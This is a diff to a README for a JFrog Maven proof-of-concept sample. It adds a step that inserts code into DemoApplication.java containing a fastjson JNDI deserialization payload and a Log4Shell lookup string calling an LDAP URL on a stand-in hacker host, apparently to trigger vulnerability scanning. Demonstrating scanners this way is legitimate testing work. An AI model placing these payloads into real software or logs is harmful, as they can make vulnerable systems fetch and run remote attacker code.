@@ -162,6 +162,18 @@ jf mvnc
 This generates a `.jfrog/projects/maven.yaml` pointing to your SaaS repositories.
 
 ### 7. Build and Deploy
+
+Add the code below into the file DemoApplication.java -> main() under jfrog-poc-samples\maven-sample\src\main\java\com\example\jfrog\demo, to call the log4j vulnerable function.
+```
+    public static void main(String[] args) {
+        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+        JSON jsonObject = JSON.parseObject(payload);
+        logger.info(jsonObject.toString());
+        logger.error("${jndi:ldap://somesitehackerofhell.com/z}");
+
+    }
+```
+
 ```shell
 jf mvn clean install -f pom.xml --build-name=sample-maven-build --build-number=1
 jf mvn deploy --build-name=sample-maven-build --build-number=1
